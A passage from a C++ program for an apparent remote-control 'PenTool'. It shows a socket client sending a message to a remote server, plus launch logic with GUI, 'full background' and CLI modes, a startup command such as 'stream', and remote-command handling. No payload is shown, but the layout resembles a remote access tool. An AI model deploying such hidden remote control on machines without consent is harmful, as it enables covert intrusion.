                std::cout << "[INFO] Sent " << sent_bytes << " bytes to server: " << remote_server_url << "\n";
                std::cout << "[INFO] Message content: \"" << msg << "\"\n";
            } else {
                std::cerr << "[ERROR] Failed to send message.\n";
            }

            #ifdef _WIN32
                closesocket(sock);
                WSACleanup();
            #else
                close(sock);
            #endif

            std::cout << "[INFO] Client finished. Press Enter to exit.\n";
            std::cin.get();
            return 0;
        }
    }

    PenTool tool;
    
    // =============================================
    // CONFIGURATION - Modify these values as needed:
    // =============================================
    // LAUNCH_MODE: 0 = GUI, 1 = Background, 2 = CLI
    // SHOW_POPUP: true/false - Show startup popup
    // RUN_STARTUP_COMMAND: true/false - Run command at startup
    // STARTUP_COMMAND: "stream" or any other command
    // =============================================
    
    // Show popup message
    if (SHOW_POPUP) {
        show_startup_popup();
    }
    
    // Run startup command
    if (RUN_STARTUP_COMMAND) {
        run_startup_command(tool);
    }
    
    // Launch based on mode
    switch (LAUNCH_MODE) {
        case 0: { // GUI Mode - added braces for scope
            std::cout << "Starting with GUI interface...\n";
            // Start background operations in separate thread
            std::thread bg_thread([&tool]() {
                while (PenTool::running) {
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            });
            tool.handle_remote({});
            bg_thread.detach();
            
            // Run GUI (blocks until GUI closes)
            run_gui(&tool);
            break;
        }
            
        case 1: // Background Mode
            std::cout << "Starting in full background mode...\n";
            tool.handle_remote({});
            run_in_background(tool);
            break;
            
        case 2: // CLI Mode (original behavior)
        default:
            std::cout << "Starting in CLI mode...\n";
            tool.handle_remote({});
            tool.run();
            break;
    }

    // Cleanup Winsock on Windows
    #ifdef _WIN32
        WSACleanup();
    #endif

    return 0;
}
